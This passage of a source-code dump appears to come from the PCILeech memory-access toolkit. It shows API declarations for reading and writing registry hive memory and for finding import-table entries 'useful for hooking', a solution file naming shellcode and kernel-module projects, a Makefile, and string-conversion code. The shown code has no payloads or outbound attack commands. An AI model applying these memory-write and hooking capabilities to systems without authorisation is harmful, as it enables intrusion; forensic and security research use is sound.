BOOL VMMDLL_WinReg_HiveList(_Out_writes_(cHives) PVMMDLL_REGISTRY_HIVE_INFORMATION pHives, _In_ DWORD cHives, _Out_ PDWORD pcHives);

/*
* Read a contigious arbitrary amount of registry hive memory and report the
* number of bytes read in pcbRead.
* NB! Address space does not include regf registry hive file header!
* -- vaCMHive
* -- ra
* -- pb
* -- cb
* -- pcbReadOpt
* -- flags = flags as in VMMDLL_FLAG_*
* -- return = success/fail. NB! reads may report as success even if 0 bytes are
*        read - it's recommended to verify pcbReadOpt parameter.
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_WinReg_HiveReadEx(_In_ ULONG64 vaCMHive, _In_ DWORD ra, _Out_ PBYTE pb, _In_ DWORD cb, _Out_opt_ PDWORD pcbReadOpt, _In_ ULONG64 flags);

/*
* Write a virtually contigious arbitrary amount of memory to a registry hive.
* NB! Address space does not include regf registry hive file header!
* -- vaCMHive
* -- ra
* -- pb
* -- cb
* -- return = TRUE on success, FALSE on partial or zero write.
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_WinReg_HiveWrite(_In_ ULONG64 vaCMHive, _In_ DWORD ra, _In_ PBYTE pb, _In_ DWORD cb);

/*
* Enumerate registry sub keys - similar to WINAPI function 'RegEnumKeyExW.'
* Please consult WINAPI function documentation for information.
* May be called with HKLM base or virtual address of CMHIVE base examples:
*   1) 'HKLM\SOFTWARE\Key\SubKey'
*   2) 'HKLM\ORPHAN\SAM\Key\SubKey'              (orphan key)
*   3) '0x<vaCMHIVE>\ROOT\Key\SubKey'
*   4) '0x<vaCMHIVE>\ORPHAN\Key\SubKey'          (orphan key)
* -- uszFullPathKey
* -- dwIndex = sub-key index 0..N (-1 for key).
* -- lpName
* -- lpcchName
* -- lpftLastWriteTime
* -- return
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_WinReg_EnumKeyExU(
    _In_ LPSTR uszFullPathKey,
    _In_ DWORD dwIndex,
    _Out_writes_opt_(*lpcchName) LPSTR lpName,
    _Inout_ LPDWORD lpcchName,
    _Out_opt_ PFILETIME lpftLastWriteTime
);

/*
* Enumerate registry values given a registry key - similar to WINAPI function
* 'EnumValueW'. Please consult WINAPI function documentation for information.
* May be called in two ways:
* May be called with HKLM base or virtual address of CMHIVE base examples:
*   1) 'HKLM\SOFTWARE\Key\SubKey'
*   2) 'HKLM\ORPHAN\SAM\Key\SubKey'              (orphan key)
*   3) '0x<vaCMHIVE>\ROOT\Key\SubKey'
*   4) '0x<vaCMHIVE>\ORPHAN\Key\SubKey'          (orphan key)
* -- uszFullPathKey
* -- dwIndex
* -- lpValueName
* -- lpcchValueName
* -- lpType
* -- lpData
* -- lpcbData
* -- return
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_WinReg_EnumValueU(
    _In_ LPSTR uszFullPathKey,
    _In_ DWORD dwIndex,
    _Out_writes_opt_(*lpcchValueName) LPSTR lpValueName,
    _Inout_ LPDWORD lpcchValueName,
    _Out_opt_ LPDWORD lpType,
    _Out_writes_opt_(*lpcbData) LPBYTE lpData,
    _Inout_opt_ LPDWORD lpcbData
);

/*
* Query a registry value given a registry key/value path - similar to WINAPI
* function 'RegQueryValueEx'.
* Please consult WINAPI function documentation for information.
* May be called with HKLM base or virtual address of CMHIVE base examples:
*   1) 'HKLM\SOFTWARE\Key\SubKey\Value'
*   2) 'HKLM\ORPHAN\SAM\Key\SubKey\'             (orphan key and default value)
*   3) '0x<vaCMHIVE>\ROOT\Key\SubKey\Value'
*   4) '0x<vaCMHIVE>\ORPHAN\Key\SubKey\Value'    (orphan key value)
* -- uszFullPathKeyValue
* -- lpType
* -- lpData
* -- lpcbData
* -- return
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_WinReg_QueryValueExU(
    _In_ LPSTR uszFullPathKeyValue,
    _Out_opt_ LPDWORD lpType,
    _Out_writes_opt_(*lpcbData) LPBYTE lpData,
    _When_(lpData == NULL, _Out_opt_) _When_(lpData != NULL, _Inout_opt_) LPDWORD lpcbData
);

/*
* Enumerate registry sub keys - similar to WINAPI function 'RegEnumKeyExW.'
* Please consult WINAPI function documentation for information.
* May be called with HKLM base or virtual address of CMHIVE base examples:
*   1) 'HKLM\SOFTWARE\Key\SubKey'
*   2) 'HKLM\ORPHAN\SAM\Key\SubKey'              (orphan key)
*   3) '0x<vaCMHIVE>\ROOT\Key\SubKey'
*   4) '0x<vaCMHIVE>\ORPHAN\Key\SubKey'          (orphan key)
* -- wszFullPathKey
* -- dwIndex = sub-key index 0..N (-1 for key).
* -- lpName
* -- lpcchName
* -- lpftLastWriteTime
* -- return
*/
_Success_(return)
BOOL VMMDLL_WinReg_EnumKeyExW(
    _In_ LPWSTR wszFullPathKey,
    _In_ DWORD dwIndex,
    _Out_writes_opt_(*lpcchName) LPWSTR lpName,
    _Inout_ LPDWORD lpcchName,
    _Out_opt_ PFILETIME lpftLastWriteTime
);

/*
* Enumerate registry values given a registry key - similar to WINAPI function
* 'EnumValueW'. Please consult WINAPI function documentation for information.
* May be called in two ways:
* May be called with HKLM base or virtual address of CMHIVE base examples:
*   1) 'HKLM\SOFTWARE\Key\SubKey'
*   2) 'HKLM\ORPHAN\SAM\Key\SubKey'              (orphan key)
*   3) '0x<vaCMHIVE>\ROOT\Key\SubKey'
*   4) '0x<vaCMHIVE>\ORPHAN\Key\SubKey'          (orphan key)
* -- wszFullPathKey
* -- dwIndex
* -- lpValueName
* -- lpcchValueName
* -- lpType
* -- lpData
* -- lpcbData
* -- return
*/
_Success_(return)
BOOL VMMDLL_WinReg_EnumValueW(
    _In_ LPWSTR wszFullPathKey,
    _In_ DWORD dwIndex,
    _Out_writes_opt_(*lpcchValueName) LPWSTR lpValueName,
    _Inout_ LPDWORD lpcchValueName,
    _Out_opt_ LPDWORD lpType,
    _Out_writes_opt_(*lpcbData) LPBYTE lpData,
    _Inout_opt_ LPDWORD lpcbData
);

/*
* Query a registry value given a registry key/value path - similar to WINAPI
* function 'RegQueryValueEx'.
* Please consult WINAPI function documentation for information.
* May be called with HKLM base or virtual address of CMHIVE base examples:
*   1) 'HKLM\SOFTWARE\Key\SubKey\Value'
*   2) 'HKLM\ORPHAN\SAM\Key\SubKey\'             (orphan key and default value)
*   3) '0x<vaCMHIVE>\ROOT\Key\SubKey\Value'
*   4) '0x<vaCMHIVE>\ORPHAN\Key\SubKey\Value'    (orphan key value)
* -- wszFullPathKeyValue
* -- lpType
* -- lpData
* -- lpcbData
* -- return
*/
_Success_(return)
BOOL VMMDLL_WinReg_QueryValueExW(
    _In_ LPWSTR wszFullPathKeyValue,
    _Out_opt_ LPDWORD lpType,
    _Out_writes_opt_(*lpcbData) LPBYTE lpData,
    _When_(lpData == NULL, _Out_opt_) _When_(lpData != NULL, _Inout_opt_) LPDWORD lpcbData
);



//-----------------------------------------------------------------------------
// WINDOWS SPECIFIC UTILITY FUNCTIONS BELOW:
//-----------------------------------------------------------------------------

typedef struct tdVMMDLL_WIN_THUNKINFO_IAT {
    BOOL fValid;
    BOOL f32;               // if TRUE fn is a 32-bit/4-byte entry, otherwise 64-bit/8-byte entry.
    ULONG64 vaThunk;        // address of import address table 'thunk'.
    ULONG64 vaFunction;     // value if import address table 'thunk' == address of imported function.
    ULONG64 vaNameModule;   // address of name string for imported module.
    ULONG64 vaNameFunction; // address of name string for imported function.
} VMMDLL_WIN_THUNKINFO_IAT, *PVMMDLL_WIN_THUNKINFO_IAT;

/*
* Retrieve information about the import address table IAT thunk for an imported
* function. This includes the virtual address of the IAT thunk which is useful
* for hooking.
* -- dwPID
* -- [uw]szModuleName
* -- szImportModuleName
* -- szImportFunctionName
* -- pThunkIAT
* -- return
*/
EXPORTED_FUNCTION
_Success_(return) BOOL VMMDLL_WinGetThunkInfoIATU(_In_ DWORD dwPID, _In_ LPSTR  uszModuleName, _In_ LPSTR szImportModuleName, _In_ LPSTR szImportFunctionName, _Out_ PVMMDLL_WIN_THUNKINFO_IAT pThunkInfoIAT);
_Success_(return) BOOL VMMDLL_WinGetThunkInfoIATW(_In_ DWORD dwPID, _In_ LPWSTR wszModuleName, _In_ LPSTR szImportModuleName, _In_ LPSTR szImportFunctionName, _Out_ PVMMDLL_WIN_THUNKINFO_IAT pThunkInfoIAT);



//-----------------------------------------------------------------------------
// VMM UTIL FUNCTIONALITY BELOW:
//-----------------------------------------------------------------------------

/*
* Fill a human readable hex ascii memory dump into the caller supplied sz buffer.
* -- pb
* -- cb
* -- cbInitialOffset = offset, must be max 0x1000 and multiple of 0x10.
* -- sz = buffer to fill, NULL to retrieve buffer size in pcsz parameter.
* -- pcsz = IF sz==NULL :: size of buffer (including space for terminating NULL) on exit
*           IF sz!=NULL :: size of buffer on entry, size of characters (excluding terminating NULL) on exit.
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_UtilFillHexAscii(
    _In_reads_opt_(cb) PBYTE pb,
    _In_ DWORD cb,
    _In_ DWORD cbInitialOffset,
    _Out_writes_opt_(*pcsz) LPSTR sz,
    _Inout_ PDWORD pcsz
);



//-----------------------------------------------------------------------------
// DEFAULT (WINDOWS ONLY) COMPATIBILITY FUNCTION DEFINITIONS BELOW:
//-----------------------------------------------------------------------------

#ifdef _WIN32
#define VMMDLL_VfsList                  VMMDLL_VfsListW
#define VMMDLL_VfsRead                  VMMDLL_VfsReadW
#define VMMDLL_VfsWrite                 VMMDLL_VfsWriteW
#define VMMDLL_ProcessGetDirectories    VMMDLL_ProcessGetDirectoriesW
#define VMMDLL_ProcessGetSections       VMMDLL_ProcessGetSectionsW
#define VMMDLL_ProcessGetProcAddress    VMMDLL_ProcessGetProcAddressW
#define VMMDLL_ProcessGetModuleBase     VMMDLL_ProcessGetModuleBaseW
#define VMMDLL_Map_GetPte               VMMDLL_Map_GetPteW
#define VMMDLL_Map_GetVad               VMMDLL_Map_GetVadW
#define VMMDLL_Map_GetModule            VMMDLL_Map_GetModuleW
#define VMMDLL_Map_GetModuleFromName    VMMDLL_Map_GetModuleFromNameW
#define VMMDLL_Map_GetUnloadedModule    VMMDLL_Map_GetUnloadedModuleW
#define VMMDLL_Map_GetEAT               VMMDLL_Map_GetEATW
#define VMMDLL_Map_GetIAT               VMMDLL_Map_GetIATW
#define VMMDLL_Map_GetHandle            VMMDLL_Map_GetHandleW
#define VMMDLL_Map_GetNet               VMMDLL_Map_GetNetW
#define VMMDLL_Map_GetUsers             VMMDLL_Map_GetUsersW
#define VMMDLL_Map_GetServices          VMMDLL_Map_GetServicesW
#define VMMDLL_WinGetThunkInfoIAT       VMMDLL_WinGetThunkInfoIATW
#endif /* _WIN32 */

#ifdef __cplusplus
}
#endif /* __cplusplus */
#endif /* __VMMDLL_H__ */

```

`pcileech.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.28729.10
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "pcileech", "pcileech\pcileech.vcxproj", "{DFFA1B4C-279B-4356-ADB1-08A6F4795931}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "pcileech_shellcode", "pcileech_shellcode\pcileech_shellcode.vcxproj", "{5C698F13-6E9F-46F3-95FC-55376A65D8BF}"
EndProject
Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "Solution Items", "Solution Items", "{41BC2617-A896-4D63-9F5E-ED26C5A613B8}"
	ProjectSection(SolutionItems) = preProject
		LICENSE = LICENSE
		readme.md = readme.md
	EndProjectSection
EndProject
Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "pcileech_kmd", "pcileech_kmd", "{2A4F90E3-A543-4D9C-9F89-CBCE396AE08A}"
EndProject
Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "linux", "linux", "{2E5DAA3B-99A5-4493-B68B-B24153FCB6E4}"
	ProjectSection(SolutionItems) = preProject
		pcileech_kmd\linux\Makefile = pcileech_kmd\linux\Makefile
		pcileech_kmd\linux\pcileech_kmd.c = pcileech_kmd\linux\pcileech_kmd.c
	EndProjectSection
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "USB3380Flash", "usb3380_flash\windows\USB3380Flash\USB3380Flash.vcxproj", "{E11BECC1-685F-41B9-A352-A6127FAB3758}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "USB3380Flash_installer", "usb3380_flash\windows\USB3380Flash_Installer\USB3380Flash_Installer.vcxproj", "{F2F4AA4A-BEFE-4738-9412-820007919334}"
	ProjectSection(ProjectDependencies) = postProject
		{DFFA1B4C-279B-4356-ADB1-08A6F4795931} = {DFFA1B4C-279B-4356-ADB1-08A6F4795931}
		{E11BECC1-685F-41B9-A352-A6127FAB3758} = {E11BECC1-685F-41B9-A352-A6127FAB3758}
	EndProjectSection
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "leechcore", "..\LeechCore\leechcore\leechcore.vcxproj", "{3476ABD2-5DEA-43E6-A676-8BE25F74535A}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "vmm", "..\MemProcFS\vmm\vmm.vcxproj", "{6326FCE0-1BA5-4AEC-9973-7783309FFD6B}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
		ReleaseMT|x64 = ReleaseMT|x64
		ReleaseMT|x86 = ReleaseMT|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{DFFA1B4C-279B-4356-ADB1-08A6F4795931}.Debug|x64.ActiveCfg = Debug|x64
		{DFFA1B4C-279B-4356-ADB1-08A6F4795931}.Debug|x64.Build.0 = Debug|x64
		{DFFA1B4C-279B-4356-ADB1-08A6F4795931}.Debug|x86.ActiveCfg = Debug|Win32
		{DFFA1B4C-279B-4356-ADB1-08A6F4795931}.Debug|x86.Build.0 = Debug|Win32
		{DFFA1B4C-279B-4356-ADB1-08A6F4795931}.Release|x64.ActiveCfg = Release|x64
		{DFFA1B4C-279B-4356-ADB1-08A6F4795931}.Release|x64.Build.0 = Release|x64
		{DFFA1B4C-279B-4356-ADB1-08A6F4795931}.Release|x86.ActiveCfg = Release|Win32
		{DFFA1B4C-279B-4356-ADB1-08A6F4795931}.Release|x86.Build.0 = Release|Win32
		{DFFA1B4C-279B-4356-ADB1-08A6F4795931}.ReleaseMT|x64.ActiveCfg = Release|x64
		{DFFA1B4C-279B-4356-ADB1-08A6F4795931}.ReleaseMT|x86.ActiveCfg = Debug|x64
		{5C698F13-6E9F-46F3-95FC-55376A65D8BF}.Debug|x64.ActiveCfg = Release|x64
		{5C698F13-6E9F-46F3-95FC-55376A65D8BF}.Debug|x86.ActiveCfg = Release|x64
		{5C698F13-6E9F-46F3-95FC-55376A65D8BF}.Release|x64.ActiveCfg = Release|x64
		{5C698F13-6E9F-46F3-95FC-55376A65D8BF}.Release|x86.ActiveCfg = Release|x64
		{5C698F13-6E9F-46F3-95FC-55376A65D8BF}.ReleaseMT|x64.ActiveCfg = Release|x64
		{5C698F13-6E9F-46F3-95FC-55376A65D8BF}.ReleaseMT|x86.ActiveCfg = Release|x64
		{E11BECC1-685F-41B9-A352-A6127FAB3758}.Debug|x64.ActiveCfg = Debug|x64
		{E11BECC1-685F-41B9-A352-A6127FAB3758}.Debug|x86.ActiveCfg = Debug|x64
		{E11BECC1-685F-41B9-A352-A6127FAB3758}.Release|x64.ActiveCfg = Release|x64
		{E11BECC1-685F-41B9-A352-A6127FAB3758}.Release|x86.ActiveCfg = Release|x64
		{E11BECC1-685F-41B9-A352-A6127FAB3758}.ReleaseMT|x64.ActiveCfg = ReleaseMT|x64
		{E11BECC1-685F-41B9-A352-A6127FAB3758}.ReleaseMT|x64.Build.0 = ReleaseMT|x64
		{E11BECC1-685F-41B9-A352-A6127FAB3758}.ReleaseMT|x86.ActiveCfg = ReleaseMT|x64
		{F2F4AA4A-BEFE-4738-9412-820007919334}.Debug|x64.ActiveCfg = Debug|x64
		{F2F4AA4A-BEFE-4738-9412-820007919334}.Debug|x86.ActiveCfg = Debug|x64
		{F2F4AA4A-BEFE-4738-9412-820007919334}.Release|x64.ActiveCfg = Release|x64
		{F2F4AA4A-BEFE-4738-9412-820007919334}.Release|x86.ActiveCfg = Release|x64
		{F2F4AA4A-BEFE-4738-9412-820007919334}.ReleaseMT|x64.ActiveCfg = ReleaseMT|x64
		{F2F4AA4A-BEFE-4738-9412-820007919334}.ReleaseMT|x64.Build.0 = ReleaseMT|x64
		{F2F4AA4A-BEFE-4738-9412-820007919334}.ReleaseMT|x86.ActiveCfg = ReleaseMT|x64
		{3476ABD2-5DEA-43E6-A676-8BE25F74535A}.Debug|x64.ActiveCfg = Debug|x64
		{3476ABD2-5DEA-43E6-A676-8BE25F74535A}.Debug|x64.Build.0 = Debug|x64
		{3476ABD2-5DEA-43E6-A676-8BE25F74535A}.Debug|x86.ActiveCfg = Debug|Win32
		{3476ABD2-5DEA-43E6-A676-8BE25F74535A}.Debug|x86.Build.0 = Debug|Win32
		{3476ABD2-5DEA-43E6-A676-8BE25F74535A}.Release|x64.ActiveCfg = Release|x64
		{3476ABD2-5DEA-43E6-A676-8BE25F74535A}.Release|x64.Build.0 = Release|x64
		{3476ABD2-5DEA-43E6-A676-8BE25F74535A}.Release|x86.ActiveCfg = Release|Win32
		{3476ABD2-5DEA-43E6-A676-8BE25F74535A}.Release|x86.Build.0 = Release|Win32
		{3476ABD2-5DEA-43E6-A676-8BE25F74535A}.ReleaseMT|x64.ActiveCfg = Release|x64
		{3476ABD2-5DEA-43E6-A676-8BE25F74535A}.ReleaseMT|x86.ActiveCfg = Release|Win32
		{6326FCE0-1BA5-4AEC-9973-7783309FFD6B}.Debug|x64.ActiveCfg = Debug|x64
		{6326FCE0-1BA5-4AEC-9973-7783309FFD6B}.Debug|x64.Build.0 = Debug|x64
		{6326FCE0-1BA5-4AEC-9973-7783309FFD6B}.Debug|x86.ActiveCfg = Debug|Win32
		{6326FCE0-1BA5-4AEC-9973-7783309FFD6B}.Debug|x86.Build.0 = Debug|Win32
		{6326FCE0-1BA5-4AEC-9973-7783309FFD6B}.Release|x64.ActiveCfg = Release|x64
		{6326FCE0-1BA5-4AEC-9973-7783309FFD6B}.Release|x64.Build.0 = Release|x64
		{6326FCE0-1BA5-4AEC-9973-7783309FFD6B}.Release|x86.ActiveCfg = Release|Win32
		{6326FCE0-1BA5-4AEC-9973-7783309FFD6B}.Release|x86.Build.0 = Release|Win32
		{6326FCE0-1BA5-4AEC-9973-7783309FFD6B}.ReleaseMT|x64.ActiveCfg = Release|x64
		{6326FCE0-1BA5-4AEC-9973-7783309FFD6B}.ReleaseMT|x86.ActiveCfg = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(NestedProjects) = preSolution
		{2A4F90E3-A543-4D9C-9F89-CBCE396AE08A} = {41BC2617-A896-4D63-9F5E-ED26C5A613B8}
		{2E5DAA3B-99A5-4493-B68B-B24153FCB6E4} = {2A4F90E3-A543-4D9C-9F89-CBCE396AE08A}
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {7D482A0F-DF96-4909-8C6B-8A4F6353DC23}
	EndGlobalSection
EndGlobal

```

`pcileech/Makefile`:

```
CC=gcc
CFLAGS  +=-I. -I../includes -D LINUX -D_GNU_SOURCE -D_FILE_OFFSET_BITS=64 -L. -l:leechcore.so -l:vmm.so -pthread
#CFLAGS  += -g -O0 -Wextra
CFLAGS  += -fPIE -fPIC -pie -fstack-protector -D_FORTIFY_SOURCE=2 -O1 -Wl,-z,noexecstack
CFLAGS  += -Wall -Wno-format-truncation -Wno-enum-compare -Wno-pointer-sign -Wno-multichar -Wno-unused-variable -Wno-unused-value
CFLAGS  += -Wno-pointer-to-int-cast -Wno-int-to-pointer-cast
LDFLAGS +=-Wl,-rpath,'$$ORIGIN' -ldl
DEPS = pcileech.h
OBJ  = oscompatibility.o charutil.o device.o pcileech.o executor.o extra.o help.o kmd.o memdump.o mempatch.o statistics.o umd.o util.o vfslist.o vfs.o vmmx.o ob/ob_cachemap.o ob/ob_core.o ob/ob_map.o ob/ob_set.o

%.o: %.c $(DEPS)
	$(CC) -c -o $@ $< $(CFLAGS)

pcileech: $(OBJ)
	cp ../files/vmm.so . || cp ../../MemProcFS*/files/vmm.so . || true
	cp ../files/leechcore.so . || cp ../../LeechCore*/files/leechcore.so . || true
	$(CC) -o $@ $^ $(CFLAGS) $(LDFLAGS)
	mv pcileech ../files/ |true
	mv vmm.so ../files/ |true
	mv leechcore.so ../files/ |true
	rm -f *.o || true
	rm -f */*.o || true
	rm -f *.so || true
	true

clean:
	rm -f *.o || true
	rm -f */*.o || true
	rm -f *.so || true

```

`pcileech/charutil.c`:

```c
// charutil.c : implementation of various character/string utility functions.
//
// (c) Ulf Frisk, 2021-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "charutil.h"

#define CHARUTIL_CONVERT_MAXSIZE            0x40000000
#define CHARUTIL_ANSIFILENAME_ALLOW \
    "0000000000000000000000000000000011011111110111101111111111010100" \
    "1111111111111111111111111111011111111111111111111111111111110111"

/*
* Check whether a string is an ansi-string (only codepoints between 0-127).
* -- sz
* -- return
*/
BOOL CharUtil_IsAnsiA(_In_ LPCSTR sz)
{
    UCHAR c;
    DWORD i = 0;
    while(TRUE) {
        c = sz[i++];
        if(c == 0) { return TRUE; }
        if(c > 127) { return FALSE; }
    }
}

BOOL CharUtil_IsAnsiW(_In_ LPCWSTR wsz)
{
    USHORT c;
    DWORD i = 0;
    while(TRUE) {
        c = wsz[i++];
        if(c == 0) { return TRUE; }
        if(c > 127) { return FALSE; }
    }
}

/*
* Convert Ascii (0-255) or Wide (16-bit LE) string into a UTF-8 string.
* Function support sz/wsz == pbBuffer - sz/wsz will then become overwritten.
* CALLER LOCALFREE (if *pjsz != pbBuffer): *pjsz
* -- usz/sz/wsz = the string to convert.
* -- cch = -1 for null-terminated string; or max number of chars (excl. null).
* -- pbBuffer = optional buffer to place the result in.
* -- cbBuffer
* -- pusz = if set to null: function calculate length only and return TRUE.
            result utf-8 string, either as (*pjsz == pbBuffer) or LocalAlloc'ed
*           buffer that caller is responsible for free.
* -- pcbu = byte length (including terminating null) of utf-8 string.
* -- flags = CHARUTIL_FLAG_NONE, CHARUTIL_FLAG_ALLOC or CHARUTIL_FLAG_TRUNCATE
* -- return
*/
_Success_(return)
BOOL CharUtil_AtoU(_In_opt_ LPSTR sz, _In_ DWORD cch, _Maybenull_ _Writable_bytes_(cbBuffer) PBYTE pbBuffer, _In_ DWORD cbBuffer, _Out_opt_ LPSTR *pusz, _Out_opt_ PDWORD pcbu, _In_ DWORD flags)
{
    UCHAR c;
    LPSTR usz;
    DWORD i, j, cba = 0, cbu = 0;
    if(pcbu) { *pcbu = 0; }
    if(pusz) { *pusz = NULL; }
    if(!sz) { sz = ""; }
    if(cch > CHARUTIL_CONVERT_MAXSIZE) { cch = CHARUTIL_CONVERT_MAXSIZE; }
    // 1: ansi byte-length and if ansi-only
    if((flags & CHARUTIL_FLAG_TRUNCATE)) {
        if(!cbBuffer || (flags & CHARUTIL_FLAG_ALLOC)) { goto fail; }
        while((cba < cch) && (c = sz[cba])) {
            if(c > 0x7f) {
                if(cba + cbu + 1 + 1 >= cbBuffer) { break; }
                cbu++;
            } else {
                if(cba + cbu + 1 >= cbBuffer) { break; }
            }
            cba++;
        }
    } else {
        while((cba < cch) && (c = sz[cba])) {
            if(c > 0x7f) { cbu++; }
            cba++;
        }
    }
    cba++;
    cbu += cba;
    if(pcbu) { *pcbu = cbu; }
    // 2: return on length-request or alloc-fail
    if(!pusz) {
        if(!(flags & CHARUTIL_FLAG_STR_BUFONLY)) { return TRUE; }   // success: length request
        if(flags & CHARUTIL_FLAG_ALLOC) { return FALSE; }
    }                                              
    if(!(flags & CHARUTIL_FLAG_ALLOC) && (!pbBuffer || (cbBuffer < cbu))) { goto fail; } // fail: insufficient buffer space
    usz = (pbBuffer && (cbBuffer >= cbu)) ? pbBuffer : LocalAlloc(0, cbu);
    if(!usz) { goto fail; }                                              // fail: failed buffer space allocation
    // 3: populate with utf-8 string (backwards to support sz == pbBuffer case)
    i = cba - 2; j = cbu - 2;
    while(i < 0x7fffffff) {
        c = sz[i--];
        if(c > 0x7f) {
            usz[j--] = 0x80 | (c & 0x3f);
            usz[j--] = 0xc0 | ((c >> 6) & 0x1f);
        } else {
            usz[j--] = c;
        }
    }
    usz[cbu - 1] = 0;
    if(pusz) { *pusz = usz; }
    return TRUE;
fail:
    if(!(flags ^ CHARUTIL_FLAG_TRUNCATE_ONFAIL_NULLSTR) && pbBuffer && cbBuffer) {
        if(pusz) { *pusz = (LPSTR)pbBuffer; }
        if(pcbu) { *pcbu = 1; }
        pbBuffer[0] = 0;
    }
    return FALSE;
}

_Success_(return)
BOOL CharUtil_UtoU(_In_opt_ LPSTR uszIn, _In_ DWORD cch, _Maybenull_ _Writable_bytes_(cbBuffer) PBYTE pbBuffer, _In_ DWORD cbBuffer, _Out_opt_ LPSTR *pusz, _Out_opt_ PDWORD pcbu, _In_ DWORD flags)
{
    // NB! function may look meaningless - but it provides some additional
    //     checking of the validity of the string and adheres to the flags.
    UCHAR c;
    LPSTR usz;
    DWORD n, cbu = 0;
    BOOL fTruncate = flags & CHARUTIL_FLAG_TRUNCATE;
    if(pcbu) { *pcbu = 0; }
    if(pusz) { *pusz = NULL; }
    if(!uszIn) { uszIn = ""; }
    if(cch > CHARUTIL_CONVERT_MAXSIZE) { cch = CHARUTIL_CONVERT_MAXSIZE; }
    // 1: utf-8 byte-length:
    if(fTruncate && (!cbBuffer || (flags & CHARUTIL_FLAG_ALLOC))) { goto fail; }
    while((cbu < cch) && (c = uszIn[cbu])) {
        if(c & 0x80) {
            // utf-8 char:
            n = 0;
            if((c & 0xe0) == 0xc0) { n = 2; }
            if((c & 0xf0) == 0xe0) { n = 3; }
            if((c & 0xf8) == 0xf0) { n = 4; }
            if(!n) { goto fail; }                                              // invalid char-encoding
            if(cbu + n > cch) { break; }
            if(fTruncate && (cbu + n >= cbBuffer)) { break; }
            if((n > 1) && ((uszIn[cbu + 1] & 0xc0) != 0x80)) { goto fail; }    // invalid char-encoding
            if((n > 2) && ((uszIn[cbu + 2] & 0xc0) != 0x80)) { goto fail; }    // invalid char-encoding
            if((n > 3) && ((uszIn[cbu + 3] & 0xc0) != 0x80)) { goto fail; }    // invalid char-encoding
            cbu += n;
        } else {
            if(fTruncate && (cbu + 1 >= cbBuffer)) { break; }
            cbu += 1;
        }
    }
    cbu++;
    if(pcbu) { *pcbu = cbu; }
    // 2: return on length-request or alloc-fail
    if(!pusz) {
        if(!(flags & CHARUTIL_FLAG_STR_BUFONLY)) { return TRUE; }   // success: length request
        if(flags & CHARUTIL_FLAG_ALLOC) { return FALSE; }
    }
    if(!(flags & CHARUTIL_FLAG_ALLOC) && (!pbBuffer || (cbBuffer < cbu))) { goto fail; } // fail: insufficient buffer space
    usz = (pbBuffer && (cbBuffer >= cbu)) ? pbBuffer : LocalAlloc(0, cbu);
    if(!usz) { goto fail; }                                                 // fail: failed buffer space allocation
    // 3: populate with utf-8 string
    if(usz != uszIn) {
        memcpy(usz, uszIn, cbu);
    }
    usz[cbu - 1] = 0;
    if(pusz) { *pusz = usz; }
    return TRUE;
fail:
    if(!(flags ^ CHARUTIL_FLAG_TRUNCATE_ONFAIL_NULLSTR) && pbBuffer && cbBuffer) {
        if(pusz) { *pusz = (LPSTR)pbBuffer; }
        if(pcbu) { *pcbu = 1; }
        pbBuffer[0] = 0;
    }
    return FALSE;
}

_Success_(return)
BOOL CharUtil_WtoU(_In_opt_ LPWSTR wsz, _In_ DWORD cch, _Maybenull_ _Writable_bytes_(cbBuffer) PBYTE pbBuffer, _In_ DWORD cbBuffer, _Out_opt_ LPSTR *pusz, _Out_opt_ PDWORD pcbu, _In_ DWORD flags)
{
    USHORT c, cZERO = 0;
    LPSTR usz;
    PUSHORT pus;
    DWORD i, j, cbw = 0, cbu = 0, chSur;
    if(pcbu) { *pcbu = 0; }
    if(pusz) { *pusz = NULL; }
    pus = wsz ? (PUSHORT)wsz : &cZERO;
    if(cch > CHARUTIL_CONVERT_MAXSIZE) { cch = CHARUTIL_CONVERT_MAXSIZE; }
    // 1: ansi byte-length and if ansi-only
    if((flags & CHARUTIL_FLAG_TRUNCATE)) {
        if(!cbBuffer || (flags & CHARUTIL_FLAG_ALLOC)) { goto fail; }
        while((cbw < cch) && (c = pus[cbw])) {
            if(c > 0x7ff) {
                if(c >= 0xD800 && c <= 0xDFFF) {
                    // surrogate pair
                    if(cbw + cbu + 1 + 2 + 1 >= cbBuffer) { break; }
                    if(cbw + 1 >= cch) { break; }    // end of string
                    if(pus[cbw + 1] < 0xD800 || pus[cbw + 1] > 0xDFFF) { goto fail; }    // fail: invalid code point
                    cbu += 2;
                    cbw++;
                } else {
                    if(cbw + cbu + 1 + 2 >= cbBuffer) { break; }
                    cbu += 2;
                }
            } else if(c > 0x7f) {
                if(cbw + cbu + 1 + 1 >= cbBuffer) { break; }
                cbu++;
            } else {
                if(cbw + cbu + 1 >= cbBuffer) { break; }
            }
            cbw++;
        }
    } else {
        while((cbw < cch) && (c = pus[cbw])) {
            if(c > 0x7ff) {
                if(c >= 0xD800 && c <= 0xDFFF) {
                    // surrogate pair
                    if(cbw + 1 >= cch) { break; }    // end of string
